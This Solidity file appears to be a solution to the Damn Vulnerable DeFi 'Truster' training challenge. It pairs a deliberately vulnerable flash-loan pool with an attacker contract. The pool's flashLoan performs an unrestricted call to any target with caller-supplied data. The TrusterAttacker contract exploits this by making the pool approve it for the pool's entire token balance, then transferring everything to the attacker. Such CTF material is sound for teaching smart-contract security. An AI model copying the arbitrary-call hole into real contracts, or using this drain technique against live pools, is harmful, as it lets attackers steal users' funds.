// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant returns (bool) {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

contract TrusterAttacker {
    DamnValuableToken public immutable i_token;
    TrusterLenderPool public immutable i_pool;
    address public immutable i_attacker;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _attacker
    ) {
        i_token = _token;
        i_pool = _pool;
        i_attacker = _attacker;
    }

    function attack() external {
        bool ok = i_pool.flashLoan(
            0,
            address(this),
            address(i_token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                i_token.balanceOf(address(i_pool))
            )
        );

        if (ok) {
            i_token.transferFrom(
                address(i_pool),
                i_attacker,
                i_token.balanceOf(address(i_pool))
            );
        }
    }

    receive() external payable {}
}
